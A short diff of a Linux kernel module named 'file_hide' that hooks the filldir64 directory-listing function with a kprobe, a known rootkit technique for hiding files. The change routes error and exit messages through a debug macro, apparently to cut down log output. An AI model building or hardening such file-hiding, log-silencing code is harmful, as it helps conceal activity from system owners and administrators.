@@ -54,7 +54,7 @@ static int __init file_hide_init(void)
 
 	ret = register_kprobe(&kp);
 	if (ret < 0) {
-		pr_err("register_kprobe failed, returned %d\n", ret);
+		dbg_print("register_kprobe failed, returned %d\n", ret);
 		return ret;
 	}
 	dbg_print("filldir64: %px\n", kp.addr);
@@ -64,7 +64,7 @@ static int __init file_hide_init(void)
 static void __exit file_hide_exit(void)
 {
 	unregister_kprobe(&kp);
-	pr_info("file_hide exit successfully\n");
+	dbg_print("file_hide exit successfully\n");
 }
 
 module_init(file_hide_init) module_exit(file_hide_exit)
